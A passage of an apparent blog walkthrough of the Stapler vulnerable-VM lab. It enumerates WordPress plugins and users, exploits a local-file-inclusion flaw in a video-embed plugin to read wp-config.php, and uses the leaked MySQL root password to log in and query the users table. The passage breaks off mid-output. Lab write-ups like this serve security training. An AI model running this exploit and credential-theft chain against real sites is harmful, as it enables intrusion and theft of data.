</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We found <span class="m">4</span> plugins:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> <span class="p">|</span>  Latest version: 1.0 <span class="o">(</span>up to date<span class="o">)</span>
</span><span class='line'> <span class="p">|</span>  Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Readme: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt&lt;/a&gt;
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> Directory listing is enabled: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also I use <code>wpscan</code> to enumerate available users and got the following result:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login   <span class="p">|</span> Name            <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> john    <span class="p">|</span> John Smith      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> elly    <span class="p">|</span> Elly Jones      <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> peter   <span class="p">|</span> Peter Parker    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> barry   <span class="p">|</span> Barry Atkins    <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> heather <span class="p">|</span> Heather Neville <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">6</span>  <span class="p">|</span> garry   <span class="p">|</span> garry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">7</span>  <span class="p">|</span> harry   <span class="p">|</span> harry           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">8</span>  <span class="p">|</span> scott   <span class="p">|</span> scott           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">9</span>  <span class="p">|</span> kathy   <span class="p">|</span> kathy           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">10</span> <span class="p">|</span> tim     <span class="p">|</span> tim             <span class="p">|</span>
</span><span class='line'>    +<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span></code></pre></td></tr></table></div></figure></p>

<p>By exploiting the Local File Inclusion vulnerability, <code>https://10.1.1.138:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php</code></p>

<p><img class="left" src="/downloads/stapler/1.png"></p>

<p>Then, back to home page and check the frontpage by right clicking and choose <code>Inspect Element (Q)</code>. Then find the thumbnail file location which is <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg</code> in this case.</p>

<p><img class="left" src="/downloads/stapler/2.png"></p>

<p>Then I use <code>curl</code> to download the thumbnail file and save it to my attacking machine.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# curl -k &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg&quot;</span>&gt;https://10.1.1.138:12380/blogblog/wp-content/uploads/577490208.jpeg&lt;/a&gt; &gt; 1.jpeg
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'><span class="m">100</span>  <span class="m">3042</span>  <span class="m">100</span>  <span class="m">3042</span>    <span class="m">0</span>     <span class="m">0</span>   <span class="m">7509</span>      <span class="m">0</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>:<span class="p">&amp;</span>ndash<span class="p">;</span>  7529
</span></code></pre></td></tr></table></div></figure></p>

<p>Then checking the file <code>1.jepg</code> which actually is the <code>wp-config.php</code> file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# strings 1.jpeg
</span><span class='line'><span class="p">&amp;</span>lt<span class="p">;</span>?php
</span><span class='line'> * The base configurations of the WordPress.
</span><span class='line'> * This file has the following configurations: MySQL settings, Table Prefix,
</span><span class='line'> * Secret Keys, and ABSPATH. You can find more information by visiting
</span><span class='line'> * <span class="o">{</span>@link &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://codex.wordpress.org/Editing_wp-config.php&quot;</span>&gt;https://codex.wordpress.org/Editing_wp-config.php&lt;/a&gt; Editing wp-config.php<span class="o">}</span>
</span><span class='line'> * Codex page. You can get the MySQL settings from your web host.
</span><span class='line'> * This file is used by the wp-config.php creation script during the
</span><span class='line'> * installation. You don<span class="p">&amp;</span>rsquo<span class="p">;</span>t have to use the web site, you can just copy this file
</span><span class='line'> * to <span class="p">&amp;</span>ldquo<span class="p">;</span>wp-config.php<span class="p">&amp;</span>rdquo<span class="p">;</span> and fill in the values.
</span><span class='line'> * @package WordPress
</span><span class='line'>// &lt;strong&gt; MySQL settings - You can get this info from your web host &lt;/strong&gt; //
</span><span class='line'>/&lt;strong&gt; The name of the database <span class="k">for</span> WordPress */
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_NAME<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/strong&gt; MySQL database username &lt;em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_USER<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>root<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/** MySQL database password &lt;/em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_PASSWORD<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>plbkac<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;strong&gt; MySQL hostname */
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_HOST<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>localhost<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/strong&gt; Database Charset to use in creating database tables. &lt;em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_CHARSET<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>utf8mb4<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/** The Database Collate type. Don<span class="p">&amp;</span>rsquo<span class="p">;</span>t change this <span class="k">if</span> in doubt. &lt;/em&gt;/
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>DB_COLLATE<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;strong&gt;#@+
</span><span class='line'> * Authentication Unique Keys and Salts.
</span><span class='line'> * Change these to different unique phrases!
</span><span class='line'> * You can generate these using the <span class="o">{</span>@link &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://api.wordpress.org/secret-key/1.1/salt/&quot;</span>&gt;https://api.wordpress.org/secret-key/1.1/salt/&lt;/a&gt; WordPress.org secret-key service<span class="o">}</span>
</span><span class='line'> * You can change these at any point in <span class="nb">time </span>to invalidate all existing cookies. This will force all users to have to log in again.
</span><span class='line'> * @since 2.6.0
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>AUTH_KEY<span class="p">&amp;</span>rsquo<span class="p">;</span>,         <span class="p">&amp;</span>lsquo<span class="p">;</span>V <span class="nv">5p</span><span class="o">=[</span>.Vds8~SX<span class="p">;</span>&gt;t<span class="o">)</span>++Tt57U6<span class="o">{</span>Xe&lt;code&gt;T<span class="p">|</span>oW^eQ!mHr <span class="o">}]</span><span class="p">&amp;</span>gt<span class="p">;</span>9RX07W<span class="p">&amp;</span>lt<span class="p">;</span>sZ,I~&lt;/code&gt;6Y5-T:<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>SECURE_AUTH_KEY<span class="p">&amp;</span>rsquo<span class="p">;</span>,  <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nv">vJZq</span><span class="o">=</span>p.Ug,<span class="o">]</span>:<span class="p">&amp;</span>lt<span class="p">;</span>-P#A<span class="p">|</span>k-+:<span class="p">;</span>JzV8&lt;em&gt;pZ<span class="p">|</span>K/U&lt;/em&gt;J<span class="o">][</span>Nyvs+<span class="o">}</span><span class="p">&amp;</span>amp<span class="p">;</span>!/#&gt;4#K7eFP5-av&lt;code&gt;n<span class="o">)</span>2<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>LOGGED_IN_KEY<span class="s1">&#39;,    &#39;</span>ql-Vfg<span class="o">[</span>?v6<span class="o">{</span>ZR*+O<span class="o">)</span><span class="p">|</span>Hf OpPWYfKX0Jmpl8zU<span class="p">&amp;</span>lt<span class="p">;</span>cr.wm?<span class="p">|</span>jqZH:YMv<span class="p">;</span>zu@tM7P:4o<span class="s1">&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>NONCE_KEY<span class="s1">&#39;,        &#39;</span>j<span class="p">|</span>V8J.~n<span class="o">}</span>R2,mlU%?C8o2<span class="o">[</span>~6Vo1<span class="o">{</span>Gt+4mykbYH<span class="p">;</span>HDAIj9TE?QQI!VW<span class="o">]]</span>D&lt;/code&gt;3i73xO<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>AUTH_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,        <span class="p">&amp;</span>lsquo<span class="p">;</span>I<span class="o">{</span>gDlDs&lt;code&gt;Z@.+/AdyzYw4%+<span class="p">&amp;</span>lt<span class="p">;</span>WsO-LDBHT<span class="o">}</span><span class="p">&amp;</span>gt<span class="p">;</span><span class="o">}</span>!<span class="o">||</span>Xrf@1E6jJNV<span class="o">={</span>p1?yMKYec*OI<span class="s1">$&#39;);</span>
</span><span class='line'><span class="s1">define(&#39;</span>SECURE_AUTH_SALT<span class="s1">&#39;, &#39;</span>.HJmx^zb<span class="o">]</span><span class="p">;</span>5P<span class="o">}</span>hM-uJ%^+9<span class="o">=</span>0SBQEh<span class="o">[[</span>*<span class="p">&amp;</span>gt<span class="p">;</span><span class="c">#z+p&amp;gt;nVi10&lt;/code&gt;XOUq (Zml~op3SG4OG_D&amp;rsquo;);</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>LOGGED_IN_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,   <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>Zz!<span class="o">)</span>%R7/w37+:9L#.<span class="o">=</span>hL:cyeMM2kTx<span class="p">&amp;</span>amp<span class="p">;</span>_nP4<span class="o">{</span>D<span class="o">}</span><span class="nv">n</span><span class="o">=</span><span class="nv">y</span><span class="o">=</span>FQt%zJw&gt;c<span class="o">[</span>a+<span class="p">;</span>ppCzIkt<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>NONCE_SALT<span class="p">&amp;</span>rsquo<span class="p">;</span>,       <span class="p">&amp;</span>lsquo<span class="p">;</span>tb<span class="o">(}</span>BfgB7l!rhDVm<span class="o">{</span>eK6&lt;sup&gt;MSN&lt;/sup&gt;-<span class="p">|</span>o<span class="o">]</span>S<span class="o">]]</span>axl4TE_y+Fi5I-RxN/9xeTsK<span class="o">]</span><span class="c">#ga_9:hJ&amp;rsquo;);</span>
</span><span class='line'>/&lt;/strong&gt;#@-&lt;em&gt;/
</span><span class='line'> * WordPress Database Table prefix.
</span><span class='line'> * You can have multiple installations in one database <span class="k">if</span> you give each a unique
</span><span class='line'> * prefix. Only numbers, letters, and underscores please!
</span><span class='line'><span class="nv">$table_prefix</span>  <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>wp_<span class="p">&amp;</span>rsquo<span class="p">;;</span>
</span><span class='line'> * For developers: WordPress debugging mode.
</span><span class='line'> * Change this to <span class="nb">true </span>to <span class="nb">enable </span>the display of notices during development.
</span><span class='line'> * It is strongly recommended that plugin and theme developers use WP_DEBUG
</span><span class='line'> * in their development environments.
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>WP_DEBUG<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">false</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;/em&gt; That<span class="p">&amp;</span>rsquo<span class="p">;</span>s all, stop editing! Happy blogging. &lt;em&gt;/
</span><span class='line'>/** Absolute path to the WordPress directory. &lt;/em&gt;/
</span><span class='line'><span class="k">if</span> <span class="o">(</span> !defined<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>ABSPATH<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="o">)</span>
</span><span class='line'>    define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>ABSPATH<span class="p">&amp;</span>rsquo<span class="p">;</span>, dirname<span class="o">(</span>&lt;strong&gt;FILE&lt;/strong&gt;<span class="o">)</span> . <span class="p">&amp;</span>lsquo<span class="p">;</span>/<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>/&lt;em&gt;* Sets up WordPress vars and included files. &lt;/em&gt;/
</span><span class='line'>require_once<span class="o">(</span>ABSPATH . <span class="p">&amp;</span>lsquo<span class="p">;</span>wp-settings.php<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>WP_HTTP_BLOCK_EXTERNAL<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="nb">true</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Now I got the MySQL database ROOT login password and the DB name:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DB_USER: root
</span><span class='line'>DB_PASS: plbkac
</span><span class='line'>DB_NAME: wordpress
</span></code></pre></td></tr></table></div></figure></p>

<p>When exploiting the Local File Inclusion vulnerability, I found the full path disclosure as well when a non-exist file name is given.</p>

<p>The full path is <font color="red"><code>/var/www/https/blogblog/</code></font></p>

<p><img class="left" src="/downloads/stapler/3.png"></p>

<p>Due to obtain the MySQL root and password, I was connected to target MySQL server with ROOT priviledge.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# mysql -h 10.1.1.138 -u root -p
</span><span class='line'>Enter password:
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 8514
</span><span class='line'>Server version: 5.7.13-0ubuntu0.16.04.2 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Copyright <span class="p">&amp;</span>copy<span class="p">;</span> 2000, 2016, Oracle and/or its affiliates. All rights reserved.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Type <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="nb">help</span><span class="p">;&amp;</span>rsquo<span class="p">;</span> or <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\h</span><span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="k">for</span> help. Type <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\c</span><span class="p">&amp;</span>rsquo<span class="p">;</span> to clear the current input statement.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt; show databases<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> Database           <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> information_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> loot               <span class="p">|</span>
</span><span class='line'><span class="p">|</span> mysql              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> performance_schema <span class="p">|</span>
</span><span class='line'><span class="p">|</span> phpmyadmin         <span class="p">|</span>
</span><span class='line'><span class="p">|</span> proof              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> sys                <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wordpress          <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">8</span> rows in <span class="nb">set</span> <span class="o">(</span>0.02 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt; use wordpress<span class="p">;</span>
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> Tables_in_wordpress   <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="p">|</span> wp_commentmeta        <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_comments           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_links              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_options            <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_postmeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_posts              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_relationships <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_term_taxonomy      <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_terms              <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_usermeta           <span class="p">|</span>
</span><span class='line'><span class="p">|</span> wp_users              <span class="p">|</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+
</span><span class='line'><span class="m">11</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;mysql&gt;
</span><span class='line'>mysql&gt; <span class="k">select</span> * from wp_users<span class="p">;</span>
</span><span class='line'>+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+<span class="p">&amp;</span>mdash<span 